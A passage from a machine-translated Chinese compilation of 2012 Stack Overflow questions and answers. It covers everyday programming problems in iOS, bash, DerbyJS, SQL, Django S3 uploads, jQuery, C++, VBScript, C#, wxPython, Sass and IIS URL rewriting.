retry 函数使用 NSTimer 再次启动相同的函数，经过短暂的延迟并使用不同的页面。使用分配工具，堆不断增长。过了一会儿，在应用程序崩溃后不久，我收到了内存警告。

当我删除所有调度调用时，一切正常，但这当然不是我想要的。另外，当我将重试方法的延迟增加到 5 秒时，问题也消失了，所以当事情快速连续处理时，似乎内存没有释放。

我绝对确保这种方法一次不会运行超过一次......有什么想法吗？

# ios - 在 iOS 中处理事件

> ID：13221559
> 
> 赞同：1
> 
> 时间：2012-11-04T18:33:51.767
> 
> 标签：ios, events, notifications, sms

iOS SDK 是否支持系统服务的事件处理？我的意思是，我可以让我的应用程序监听外部事件，例如短信接收、电池电量...

我在 iOS 开发人员的网站上寻找文档，看起来我可以处理的唯一类型的事件是与 UI 交互时的用户事件、由 UI 控件触发的事件、Cocoa 事件、加速度计和 GPS 事件：[事件处理指南iOS](http://developer.apple.com/library/ios/#documentation/EventHandling/Conceptual/EventHandlingiPhoneOS/EventsiPhoneOS/EventsiPhoneOS.html#//apple_ref/doc/uid/TP40009541-CH2-SW1)

这些实际上是可以在应用程序中收听的所有事件，还是我缺少一些关于系统事件的其他文档，就像我提到的那样？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:40:52.773

结帐[NSNotificationCenter](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSNotificationCenter_Class/Reference/Reference.html)。

对于电池电量变化，请查看[UIDevice 中定义的 UIDeviceBatteryLevelDidChangeNotification](http://developer.apple.com/library/ios/#documentation/uikit/reference/UIDevice_Class/Reference/UIDevice.html) - 你可以这样做：

```
// Register for battery level and state change notifications.
[[NSNotificationCenter defaultCenter] addObserver:self
                                         selector:@selector(batteryLevelDidChange:)
                                             name:UIDeviceBatteryLevelDidChangeNotification object:nil]; 
```

这是一个苹果样本：

[http://developer.apple.com/library/ios/#samplecode/BatteryStatus/Introduction/Intro.html#//apple_ref/doc/uid/DTS40008812-Intro-DontLinkElementID_2](http://developer.apple.com/library/ios/#samplecode/BatteryStatus/Introduction/Intro.html#//apple_ref/doc/uid/DTS40008812-Intro-DontLinkElementID_2)

不确定 SMS 事件 - 发现无法通过公共 API 获得它的提及，但这可能已经改变。什么都不知道。

# bash - 如何在bash中检索f5

> ID：13221578
> 
> 赞同：1
> 
> 时间：2012-11-04T18:35:28.633
> 
> 标签：bash

任何人都建议如何修复此代码？读取时 F5 出现问题。请帮忙..

```
read -sn3 KEY

case "$KEY" in
     $'\x1b[A') echo "press arrow up";;
     $'\x1b[B') echo "press arrow down";;
     $'???') echo "press key F5";;
esac 
```

谢谢大家的帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T18:50:41.180

```
$ od -c <<< "<Ctrl-V><F5>"
0000000 033   [   1   5   ~  \n
0000006 
```

# derbyjs - 在derby js中创建用户登录

> ID：13221584
> 
> 赞同：1
> 
> 时间：2012-11-04T18:36:07.910
> 
> 标签：derbyjs

似乎用户登录等基本功能无法以简单的方式完成：在客户端的表单中拥有用户名和密码字段，并基于此创建 store.readPathAccess 模型访问权限。另外，如何检查用户是否登录以实现对路由的访问权限？

基于示例和（糟糕的）DerbyJS 文档，如果我理解正确，您必须在服务器模块（lib/server/*）中实现登录，因为：

1.  store.readPathAccess 必须在服务器端使用
2.  您想将数据存储在模型会话中（只能在服务器端读取）

但是出现了很多问题：

1.  如果必须在服务器端完成，如何在服务器端获取和存储客户端表单数据而不会遇到列表下面第二项的问题（我已经通过手动将数据提交到仅服务器路由来完成，但那时不能使用本地密钥将其保存在模型中，因为之后我必须重定向到客户端路由并且本地模型数据丢失）
2.  如果必须将数据存储在会话中，如何稍后读取该数据？
3.  即使管理模型的商店访问权限，如何在客户端路由中检查此特定用户是否已登录？

我现在很困惑......喜欢德比原则，但这个身份验证问题正在严重地玩弄我的神经。

我知道我可能不太清楚，但是有很多细节需要详细说明，如果有人可以提供帮助，我很乐意提供更多必需的信息。

谢谢你，埃迪

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T01:14:42.357

我今天找到了这个名为[derby-auth 的](https://github.com/lefnire/derby-auth)库。它使用护照登录，并有一个使用简单的注册和登录表单的好例子。它的作用是在服务器上设置一些路由来记录用户，以及一个中间件来告诉客户端它是否被记录。它确实有一些错误（缺少一些回调调用会破坏一些东西），所以我基于此编写了自己的，但在上传任何地方之前必须清理很多东西。不过，如果你愿意，我很乐意把它寄给你。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-06-12T01:30:54.630

最新的库是[https://github.com/derbyparty/derby-login](https://github.com/derbyparty/derby-login)

它已定期更新并适用于 derbyjs 0.6

# sql - SQL 从多个表中检索信息

> ID：13221588
> 
> 赞同：0
> 
> 时间：2012-11-04T18:36:15.787
> 
> 标签：sql, sql-server

我有一个关于 sql 的问题，我需要知道我是否可以只使用 sql 检索结果。

我需要找到从 1 号站开始并到达 4 号站的 id=1 的路线的公里距离。所以路线 1 将从 4 个站经过（数量可能或多或少）。我需要找到一列火车穿越所有 4 个车站的距离。即：5+10+15=30

是否可以仅使用 SQL 获得答案？

以下是表格（我希望您了解结构）：

[你可以在这里](http://studio9.com.cy/testing/sql.gif)看到一张桌子的图片

```
route - station
-----------------------
1     - 1    
1     - 2    
1     - 3    
1     - 4

station1 - station2 - distance (km)
------------------------------------
1        - 2        -   5
2        - 3        -   10
3        - 4        -   15 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T19:06:46.927

像这样的东西，但是对站点的排序，距离如何定义等有很多假设。这只是一种方法的示例（并使用 Postgresql）：

```
create table route(route_id int, station_id int);
create table distance(station1_id int, station2_id int, km int);

insert into route values(1, 1);
insert into route values(1, 2);
insert into route values(1, 3);
insert into route values(1, 4);

insert into distance values(1, 2, 5);
insert into distance values(2, 3, 10);
insert into distance values(3, 4, 15);

select route_id, sum(km)
  from (select route_id, station_id
              ,lead(station_id) over(partition by route_id order by station_id) AS next_station_id
          from route
       ) a
      ,distance d
  where d.station1_id = a.station_id
    and d.station2_id = a.next_station_id
  group by route_id; 
```

样本输出：

```
postgres=# select route_id, station_id
postgres-#               ,lead(station_id) over(partition by route_id order by s
tation_id) AS next_station_id
postgres-#           from route;
 route_id | station_id | next_station_id
----------+------------+-----------------
        1 |          1 |               2
        1 |          2 |               3
        1 |          3 |               4
        1 |          4 |
(4 rows)

postgres=# select route_id, station_id, next_station_id, d.km
postgres-#   from (select route_id, station_id
postgres(#               ,lead(station_id) over(partition by route_id order by s
tation_id) AS next_station_id
postgres(#           from route
postgres(#        ) a
postgres-#       ,distance d
postgres-#   where d.station1_id = a.station_id
postgres-#     and d.station2_id = a.next_station_id;
 route_id | station_id | next_station_id | km
----------+------------+-----------------+----
        1 |          1 |               2 |  5
        1 |          2 |               3 | 10
        1 |          3 |               4 | 15
(3 rows)

postgres=# select route_id, sum(km)
postgres-#   from (select route_id, station_id
postgres(#               ,lead(station_id) over(partition by route_id order by s
tation_id) AS next_station_id
postgres(#           from route
postgres(#        ) a
postgres-#       ,distance d
postgres-#   where d.station1_id = a.station_id
postgres-#     and d.station2_id = a.next_station_id
postgres-#   group by route_id;
 route_id | sum
----------+-----
        1 |  30
(1 row)

postgres=# 
```

# django - 0 字节上传到 Django 应用程序中的 Amazon S3

> ID：13221589
> 
> 赞同：0
> 
> 时间：2012-11-04T18:36:45.227
> 
> 标签：django, amazon-s3

突然，当我将文件上传到 S3 时，它上传为 0 字节。

我不确定为什么会突然发生这种情况，因为它之前工作正常。这是我的代码：

```
def store_in_s3_avatar(pathtofile, avatarimage, filename, user):
    conn = S3Connection(settings.AWS_ACCESS_KEY_ID, settings.AWS_SECRET_ACCESS_KEY)
    b = conn.create_bucket('mybucket')
    mime = mimetypes.guess_type(filename)[0]
    k = Key(b)
    k.key = "/media/avatars/%s/%s" % (user,filename)
    k.set_metadata("Content-Type", mime)
    k.set_contents_from_string(avatarimage)
    k.set_acl("public-read")
    return pathtofile 
```

这是调用此函数的 views.py 片段：

```
 if request.method == "POST":
        updated = False
        if 'avatar' in request.FILES:
            path = avatar_file_path(user=request.user, 
                filename=request.FILES['avatar'].name)
            avatar = Avatar(
                user = request.user,
                primary = True,
                avatar = path,
            )
            new_file = avatar.avatar.storage.save(path, request.FILES['avatar'])
            avatarcontent = request.FILES['avatar']
            filename = request.FILES['avatar'].name
            avatarimage = avatarcontent.read()
            user=request.user
            avatar.avatar = store_in_s3_avatar(path, avatarimage, filename, user)
            avatar.save()
            ... 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T19:32:27.933

根据您所描述的行为，我敢打赌文件指针位于末尾，因为您只是显式调用了该`storage.save()`函数。通过两次读取文件，您将一无所获。

```
f = StringIO.StringIO('foobar')
f.read() # out 'foobar'
f.read() # out ''
f.seek(0) 
f.read() # out 'foobar' 
```

# jquery - jQuery块用户界面不起作用

> ID：13221592
> 
> 赞同：1
> 
> 时间：2012-11-04T18:37:27.273
> 
> 标签：jquery

我在设置 jQuery 块 UI 时遇到了困难。它似乎不起作用（即模式开放_，我似乎无法指出我犯了错误的地方。这是我到目前为止所做的：http: [//jsfiddle.net/4vJLN /](http://jsfiddle.net/4vJLN/)。

我的代码如下：

JS

```
$(document).ready(function () {

    $('.windowClass').click(function () { // <-- bind to all window elements with that class
        $.blockUI({
            message: $('#' + this.id + '_win'),
            css: {
                top:  ($(window).height() - 400) /2 + 'px', 
                left: ($(window).width() - 600) /2 + 'px', 
                width: '600px',
                height: '400px'
            }
        });
    });

    $('[id$=_close]').click(function () { //<-- gets all elements with id's that end with close
        $.unblockUI();
        return false;
    });
});

$(window).on('resize', function () {
    $('body').children('.blockMsg').css({
        top  : ($(window).height() - 400) /2 + 'px', 
        left : ($(window).width() - 600) /2 + 'px'
    });
});​ 
```

HTML

```
<div id="forgotpass_link" class="modal">
  <div class="modal_headerwrapper">
    <div class="modal_header">Get started with a free account</div>
    <div class="modal_close">Close</div>
  </div>
  <div class="modal_bodywrapper">
    <div class="modal_body">ddd</div>
  </div>
</div>

<a class="windowClass" id="forgotpass_link">Forgot your password?</a>​ 
```

CSS

```
#forgotpass_link {
    color: #306;
}
#forgotpass_link:hover {
    color: #C06;
    cursor: pointer;
}
.modal {
    display: none;
    cursor: default;
}
.modal_headerwrapper {
    width: 100%;
    background-color: #eeeeee;
    height: 45px;
}
.modal_header {
    float: left;
    font-size: 20px;
    padding: 10px;
}
.modal_bodywrapper {
    width: 100%;
}
.modal_body {
    padding: 15px;
    font-size: 12px;
    cursor: default;
    line-height: 1.5em;
    overflow: auto;
    height: 325px;
    text-align: justify;
}
.modal_close {
    cursor: pointer;
    float: right;
    padding: 10px;
} 
```

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T19:29:39.537

我在 document.ready 函数中更改了一些代码，关闭链接有一个类而不是 ID：

```
$(document).ready(function () {
    $('.windowClass').click(function () { // <-- bind to all window elements with that class
        $.blockUI({
            message: $('#' + this.id + '_win'),
            css: {
                top:  ($(window).height() - 400) /2 + 'px', 
                left: ($(window).width() - 600) /2 + 'px', 
                width: '600px',
                height: '400px'
            }
        });
    });

    $('[class$=_close]').click(function () { //<-- gets all elements with class that end with close
        $.unblockUI();
        return false;
    });
    }); 
```

在 html 中，我正确设置了模态窗口的 ID：

```
<div id="forgotpass_win" class="modal">
  <div class="modal_headerwrapper">
    <div class="modal_header">Get started with a free account</div>
    <div class="modal_close">Close</div>
  </div>
  <div class="modal_bodywrapper">
    <div class="modal_body">ddd</div>
  </div>
</div>
<a class="windowClass" id="forgotpass_link">Forgot your password?</a>​ 
```

这是一个工作小提琴[http://jsfiddle.net/4vJLN/4/](http://jsfiddle.net/4vJLN/4/)。

# c++ - “核心语言”是什么意思？

> ID：13221593
> 
> 赞同：9
> 
> 时间：2012-11-04T18:37:31.123
> 
> 标签：c++, gcc

[在 GCC 文档的此页面](http://gcc.gnu.org/gcc-4.7/cxx0x_status.html)上的表格中，其中一项（大约在表格的中间）仅列为“核心语言”。这意味着什么？语言的哪些部分不包括在内？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-04T19:01:21.923

标准库是语言的一部分。为了表达只涉及语法规则、语义规则等而不涉及库的语言子集，人们使用术语*核心语言*。例如，C++ 委员会中有一个名为“核心工作组”（CWG）和“库工作组”（LWG）的工作组。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-04T19:02:30.163

人们通常指的是 C++ 的所有内容，除了标准库，它也是语言规范的一部分。

举一个更权威的例子，Stephan T. Lavavej (STL) 是 Microsoft 的关键 C++ 开发人员。*在他关于核心语言*的系列讲座中，他将其定义为**您可以访问的任何内容，而不包括任何标题。**

他不认为自己是核心语言开发人员。例如，他研究的`shared_ptr`是 C++11 的基本部分，可以说比评论中提到的字符串和流更基本。

C++ 标准没有提到*Core Language*，但*标准库*是

```
17 Library introduction
18 Language support library
19 Diagnostics library
20 General utilities library
21 Strings library
22 Localization library
23 Containers library
24 Iterators library
25 Algorithms library
26 Numerics library
27 Input/output library
28 Regular expressions library
29 Atomic operations library
30 Thread support library 
```

我认为第 1-16 章（几乎？）只涉及核心语言，但可能还有更多。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-04T20:02:32.910

Johannes 的[回答](https://stackoverflow.com/a/13221794/981959)解释了“核心语言”的一般含义。在您询问的特定上下文中，这意味着[n3050](http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2010/n3050.html)的核心语言部分是在 GCC 4.7 中实现的，但不一定是库部分（论文中适用于第 17-30 条的那些更改）

事实上，一些库更改也在 GCC 4.7 中实现，但库状态记录[在其他地方](http://gcc.gnu.org/onlinedocs/gcc-4.7.2/libstdc++/manual/manual/status.html#status.iso.2011)

# ios - 移除第一个注解-MapView

> ID：13221594
> 
> 赞同：0
> 
> 时间：2012-11-04T18:37:41.483
> 
> 标签：ios, android-mapview

> **可能重复：**
> [删除第一个 Annotation-MapView iOS](https://stackoverflow.com/questions/13221757/removing-first-annotation-mapview-ios)

我正在研究地图视图项目。我有问题要从地图视图中删除注释。总注释点为 5。如何从我的 mapView 中删除第一个注释。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:42:50.657

我想我已经得到了答案

```
[mapView removeAnnotation:[self.mapView.annotations objectAtIndex:0]]; 
```

# ruby-on-rails - 空 gem 列表，但可以使用 rails --version

> ID：13221597
> 
> 赞同：3
> 
> 时间：2012-11-04T18:38:19.160
> 
> 标签：ruby-on-rails, ruby

我知道 Rails 是一颗宝石。这意味着当我跑步时

```
gem list 
```

终端应该为我呼应名称 rails。

我的问题是我可以跑

```
rails --version 
```

但是当涉及到`gem list`我只收到`*LOCAL GAME LIST*`没有任何文字的时候。

有什么问题？是我的理解吗？

感谢你并致以真诚的问候

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:43:54.567

### 检查您的路径和/或包管理器

如果您通过包管理器而不是作为 gem 安装 Rails，那么您的本地 gem 列表*将为*空。如果您运行的是 Debian 或 Ubuntu，`dpkg -l rails`将显示它是否作为系统包安装。

您还可以`which rails`在命令行上找到您正在调用的二进制文件。如果您进行了源代码安装，这可能会告诉您 Rails 应用程序在 PATH 中的位置。

# iphone - 如何禁用 UIWebView 上的标准双击手势？

> ID：13221598
> 
> 赞同：1
> 
> 时间：2012-11-04T18:38:19.537
> 
> 标签：iphone, ipad, uiwebview, gestures

如何禁用标准的双击手势`UIWebView`？但所有其他手势应该继续有效。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-05T16:44:34.993

看看我的回答，关于问题的第 2 部分：[禁用 UIWebView 中的用户选择](https://stackoverflow.com/questions/5995210/disabling-user-selection-in-uiwebview)

# vbscript - VBS If Then Else

> ID：13221605
> 
> 赞同：1
> 
> 时间：2012-11-04T18:39:20.160
> 
> 标签：vbscript

我是 VBS 的新手，我正在尝试在 Windows 中的 UAC 上开始 - 一种做事的意愿，反过来，学习。

我不明白为什么我在最后一个 End If 之前的行中不断出现语法错误

如果您能提供帮助，我将不胜感激！

```
CurPass = ReadIni("C:\Program Files\User Account Control\ident.ini", "pass", "pass")
InpPass = inputbox("Please enter your current password:")
If InpPass = CurPass Then
NewPass = inputbox("Please enter your new password")
    if NewPass=CurPass Then 
        KpPass=msgbox("Your new password is the same as your old password. Keep old password?",4+32,"UAC")
        if KpPass=7 Then MsgBox("Please try again")
        end if
    Else 
        RNewPass = inputbox("Please re-enter your new password")
    end if
    if RNewPass=NewPass then 
        WriteIni "C:\Program Files\User Account Control\ident.ini", "pass", "Pass", NewPass
    else msgbox("Your new passwords do not match. Try again.")
    end If
else msgbox("Incorrect password")
End if 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T19:02:12.517

没有 If .. 那么对于你的最后一个 Else .. End If。如果您使用了适当的缩进，这将立即显而易见。

**更新：以上诊断错误。**

我想你想要这个结构：

```
CurPass = ""
InpPass = ""
If InpPass = CurPass Then
   NewPass = ""
   If NewPass = CurPass Then
      KpPass = ""
      If KpPass = "7" Then
         KpPass = "4711"
      End If
   Else
      RNewPass = ""
   End If
   If RNewPass = NewPass Then
      RNewPass = "xx"
   Else
      RNewPass = "yy"
   End If
Else
   CurPass = "whatamess"
End If 
```

然后，当您编写以下内容时，VBScript 迷失了方向：

```
if KpPass=7 Then MsgBox("Please try again")
end if 
```

你可以有'短如果'像

```
If Condition Then OneStatementAction 
```

但是应该没有`End If`。这有点像在其他类似 C 的语言中为单行/语句条件省略 {}。那就是：最好避免。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2013-12-29T13:33:33.797

End IF 是一个表达式，告诉 VB.NET 你完成了你的条件。

每个 IF 都可能以 END IF 结束

所以你的代码可能是这样的：

```
If textbox1.text = "Cat" Then

   Do something
Else
   Do not do that thing
End If 
```

再次检查您的代码并避免编写 End IF，然后查看：

```
If textbox1.text = "Cat" Then

   Do something
End IF

Else
   Do not do that thing
End If 
```

// 这行不通！一个条件中不能有多个 IF：

这是不正确的：

```
IF something Then
  IF blabla bla then
Else
Endif 
```

请参阅此处的链接，您可以在其中学习如何使用 therse：http: [//msdn.microsoft.com/en-us/library/752y8abs.aspx](http://msdn.microsoft.com/en-us/library/752y8abs.aspx)

# c# - 获取返回空

> ID：13221610
> 
> 赞同：0
> 
> 时间：2012-11-04T18:40:18.803
> 
> 标签：c#, .net

我有一些课

```
public static class SessionManager
{
    public static UserSession UserSession
    {
        set
        {                
           HttpContext.Current.Session["USER_SESSION"] = value;
        }
        get
        {
           UserSession userSession = new UserSession();

           try
           {
              userSession = (UserSession)HttpContext.Current.Session["USER_SESSION"];
           }
           catch (Exception)
           {
           }

           return userSession;
       }
   }
} 
```

我正在尝试使用它

```
var userSession = SessionManager.UserSession; 
```

而且`userSesssion`总是`null`。

任何线索如何解决？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T19:01:14.323

我认为您实际上在您的财产中寻找的模式看起来更像这样：

```
public static class SessionManager
{
    public static UserSession UserSession
    {
        set
        {                
           HttpContext.Current.Session["USER_SESSION"] = value;
        }
        get
        {
            var session = HttpContext.Current.Session;
            var userSession = session["USER_SESSION"] as UserSession;

            if (userSession == null)
            {
                userSession = new UserSession ();
                session["USER_SESSION"] = userSession;
            }

            return userSession;
        }
    }
} 
```

（我只是爆发了，`var session = HttpContext.Current.Session;`所以它很适合 StackOverflow。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T18:46:20.120

尝试这个：

```
userSession = (UserSession)(HttpContext.Current.Session["USER_SESSION"]); 
```

-或者-

```
userSession = HttpContext.Current.Session["USER_SESSION"] as UserSession; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T18:49:58.750

I found solution...

I just forgot to insert under Global.asax.cs

```
void Session_Start(object sender, EventArgs e)
        {
            var userSession = new UserSession();

            SessionManager.UserSession = userSession; 

        } 
```

# python - 获取指针的像素位置

> ID：13221616
> 
> 赞同：1
> 
> 时间：2012-11-04T18:41:00.170
> 
> 标签：python, wxpython

是否可以使用标准 Python 库以像素值获取光标位置？

我无法正确定位弹出菜单：

```
 pos = self.text.GetLastPosition()
    start, end = self.text.PositionToXY(pos)

    self.text.PopupMenuXY(self.popupmenu,start, end) 
```

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T20:38:06.480

要使用 wxPython 获取鼠标位置，您可以使用：

```
pos = wx.GetMousePosition() # in screen coordinates 
```

这为您提供了屏幕坐标中的 XY 位置作为元组。如果您需要相对于小部件的位置，则必须通过在小部件上调用 ScreenToClient() 将其转换为客户端坐标。

```
pos = self.textctrl.ScreenToClient(pos) # relative to textctrl 
```

如果你只想在当前鼠标位置显示一个弹出菜单，你可以跳过这个并调用 PopupMenu() 而不提供位置：

```
self.PopupMenu(self.popupmenu) # pop up menu at mouse position 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T18:43:58.220

不使用*标准*python 库，因为它依赖于平台。在 Windows 上，您可以使用 winapi：

```
import win32api
x, y = win32api.GetCursorPos() 
```

在 Linux 上，您可以使用 xlib：

```
from Xlib.display import Display   
display = Display()
coord = display.screen().root.query_pointer()._data
x = coord["root_x"]
y = coord["root_y"] 
```

# c++ - 商业应用程序许可问题和 libpcap 应用程序的解决方案

> ID：13221620
> 
> 赞同：0
> 
> 时间：2012-11-04T18:41:27.463
> 
> 标签：c++, libpcap, tcpdump

我想在处理从数据包嗅探器中提取的数据领域开发一些商业工具。我知道这`libpcap`是可用的，但我很确定由于许可问题存在许多限制。

假设我没有将我的应用程序直接链接到`libpcap`库，而是使用`tcpdump`转发到套接字或管道的输出作为我的工具的提要..你认为我会从法律/许可点遇到麻烦吗观点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T18:46:42.753

最好的办法是[直接查看许可证](http://www.tcpdump.org/license.html)，这是一个 3 条款 BSD 许可证。在商业应用中的使用没有限制。

您最有可能从您选择的律师那里获得可靠的法律建议。

# textfield - 如何创建像诺基亚一样的搜索文本字段？

> ID：13221621
> 
> 赞同：1
> 
> 时间：2012-11-04T18:41:29.000
> 
> 标签：textfield, lwuit

在诺基亚 S40 中，联系人的搜索字段如下所示

![在此处输入图像描述](../Images/29fee307e4e352792c558cc5a5e706d7.png)

这`TextField`真的是互动的，如果我放一些文字，放大镜会变成 x `Button`。我试图`TextField`在 LWUIT 中创建并覆盖绘制方法以放置放大镜图像，但它不能用作按钮。

是否有任何组件可以用来重新创建这样的东西（特别是使用 LWUIT）？或者也许诺基亚有任何现成的组件来创建这样的东西？

最好的祝福

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T20:06:50.710

你可以做类似的事情，但它看起来不像原生的 SearchField，但它会正常工作。

你能做的就是这个。`TextField`创建一个带有 boxLayoutX 的容器并将 a和 a放入其中`Button`。当您捕捉到`TextField`里面有文本时，将附加到的图像更改为`Button`X，就在这里。您只需要实现`Button`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-14T08:18:26.140

TextField 有一个`setHintIcon`方法可以让你做到这一点。

# xcode - NSManagedObjectContext 以 value 开头并变为 null

> ID：13221626
> 
> 赞同：0
> 
> 时间：2012-11-04T18:42:12.290
> 
> 标签：xcode, core-data, ios6, nsmanagedobjectcontext

我刚刚开始开发 iPad 应用程序，我在一个问题上苦苦挣扎了太久，所以我决定寻求帮助。

我有一个使用情节提要的 iPad 应用程序，并作为使用 CoreData 的选项卡式应用程序启动。所以问题是，我的 NSManagedObjectContext 以一个值开头，但是当我移动到另一个选项卡时，managedObjectContext 变为空。

不知道该怎么办。一些帮助将不胜感激。

谢谢

埃尔库乔

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T20:37:39.997

我有点困惑……

```
self.window.rootViewController 
```

应该返回你的实例`UITabBarController`，它不应该响应`setManagedObjectContext:`，因此应该崩溃。

考虑到这一点，您需要做什么

1.  获取 tabBarController
2.  循环浏览 tabBarController 管理的 viewController
3.  将 managedObjectContext 传递给他们

    ```
    for (id viewController in self.window.rootViewController.viewControllers) {
      [viewController setManagedObjectContext:self.managedObjectContext];
    } 
    ```

## 编辑

我快速浏览了一下。

*   你很少需要子类化`UITabBarController`，在这种情况下你也不需要。您要做的只是获取`managedObjectContext`tabBarController 中的每个 viewController，tabBarController 本身确实需要知道它。

我将您更改`application:didFinishLaunchingWithOptions:`为以下内容，并且按照应有的方式工作

```
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
  UITabBarController *tabBarController = (id)self.window.rootViewController;

  for (id viewController in tabBarController.viewControllers) {
    [viewController setManagedObjectContext:self.managedObjectContext];
  }
} 
```

# sass - 如何解析mixin中的字符串参数，或者如何从生成的css中删除引号？（.scss - SASS）

> ID：13221636
> 
> 赞同：1
> 
> 时间：2012-11-04T18:43:04.770
> 
> 标签：sass

我是 SCSS（或任何其他类型的编码 rs）的新手，只是在玩 sass，然后我遇到了一个问题。

我试图将多个阴影混合到一个盒子阴影中，我们在传统的 css 中都知道，它应该是这样的：

```
box-shadow: 0 1px 1px #333, 0 0 10px #222 
```

然后我编写了这个mixin：

```
@mixin set_shadow($shadows){
  -moz-box-shadow:$shadows;
  -webkit-box-shadow:$shadows;
  box-shadow:$shadows;
} 
```

结果几乎是我想要的：

```
-moz-box-shadow: "0px 1px 1px black, 0px 0px 3px black";
-webkit-box-shadow: "0px 1px 1px black, 0px 0px 3px black";
box-shadow: "0px 1px 1px black, 0px 0px 3px black"; 
```

Buuut...可悲的是..

引号不允许代码工作

如何解析 .scss (SASS) 中的字符串参数，或者如何从生成的 css 中删除引号？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-04T19:18:48.530

似乎该 [`unquote()`](http://sass-lang.com/docs/yardoc/Sass/Script/Functions.html#unquote-instance_method)功能就是您要寻找的功能：

```
@mixin set_shadow($shadows){
  -moz-box-shadow: unquote($shadows);
  -webkit-box-shadow: unquote($shadows);
  box-shadow: unquote($shadows);
}

h1 {
  @include set_shadow("0 1px 1px #333, 0 0 10px #222");
} 
```

或者，您可以使用[可变参数](http://sass-lang.com/docs/yardoc/file.SASS_REFERENCE.html#variable_arguments)。然后传递一个未引用的阴影列表。

```
@mixin set_shadow($shadows...){
  -moz-box-shadow: $shadows;
  -webkit-box-shadow: $shadows;
  box-shadow: $shadows;
}

h1 {
  @include set_shadow(0 1px 1px #333, 0 0 10px #222);
} 
```

# sql-server - SQL Server 存储过程中的多个变量

> ID：13221637
> 
> 赞同：0
> 
> 时间：2012-11-04T18:43:12.273
> 
> 标签：sql-server, variables, stored-procedures

我被困在这个存储过程中分配的变量值上。

```
@EntityID int,
@Title1 varchar(10) OUTPUT,
@Title2 varchar(10) OUTPUT
AS
  Declare @T1 varchar(10)
  Declare @T2 varchar(10)
BEGIN

    SELECT     
       dbo.Entity.EntityID, dbo.Types.TypeName AS Title1, Types_1.TypeName AS Title2
    FROM         
       dbo.Entity 
    LEFT OUTER JOIN
       dbo.Types AS Types_1 ON dbo.Entity.Title2 = Types_1.TypeID 
                            AND dbo.Entity.Title2 = Types_1.TypeID 
    LEFT OUTER JOIN
       dbo.Types ON dbo.Entity.Title1 = dbo.Types.TypeID
    WHERE     
       (dbo.Entity.EntityID = @EntityID)
END 
```

我正在尝试返回`Title1`and的值`Title2`。查询有效，并返回值，但我需要在其他地方使用它们。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:49:04.800

```
SELECT     @Title1 = dbo.Types.TypeName
,          @Title2 = Types_1.TypeName
... 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T23:04:56.337

你需要做两件事：

首先，使用 SELECT 或 SET 在 PROC 中的某处设置这些参数的值。正如@Andomar 提到的，这可以通过像这样更改您的 SELECT 语句来完成（在您现有的代码中，您将返回具有相同名称的列中的值，但实际上不会设置参数）：

```
SELECT @Title1 = dbo.Types.TypeName, @Title2 = Types_1.TypeName 
```

然后，您需要在调用程序中捕获这些值。我不确定您是从另一段 SQL 代码还是从 ADO.NET 之类的代码调用此存储过程。如果来自 SQL，则需要先声明输出参数，然后像这样调用 proc：

```
DECLARE @Title1 VARCHAR(10), @Title2 VARCHAR(10)
EXEC MyProc @Title1=@Title1 OUTPUT, @Title2=@Title2 OUTPUT 
```

如果从 ADO.NET 调用，则需要[将 ParameterDirection 设置为 Output 或 InputOutput](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlparameter.aspx)，使用参数调用 proc，然后读取参数的值。

# asp.net - asp.net 激活 URL 重写 IIS7

> ID：13221638
> 
> 赞同：0
> 
> 时间：2012-11-04T18:43:30.900
> 
> 标签：asp.net, iis-7, url-rewriting, web-config

如何在我的项目中激活 URL 重写。我安装了 URL Rewrite，我在我的 IIS 中看到它

当我在我的 web.config 文件中添加一个简单的规则时，例如一个规则只是从 url 中删除 default.aspx 或使 url 小写

```
<configuration>

<system.web>
    <compilation debug="false" targetFramework="4.0" />
</system.web>
<system.webServer>

  <rewrite>
    <rules>
      <rule name="LowerCaseRule1" stopProcessing="true">
                <match url="[A-Z]" ignoreCase="false" />
                <action type="Redirect" url="{ToLower:{URL}}" />
      </rule>

      <rule name="Default Document" stopProcessing="true">
        <match url="(.*)Default.aspx" />
        <action type="Redirect" url="{R:1}" redirectType="Permanent" />
      </rule>

    </rules>
  </rewrite>
</system.webServer>
</configuration> 
```

当我运行项目时，规则不起作用，请指教，谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T09:47:43.883

我没有尝试过上面的代码，但很久以前就做过了。

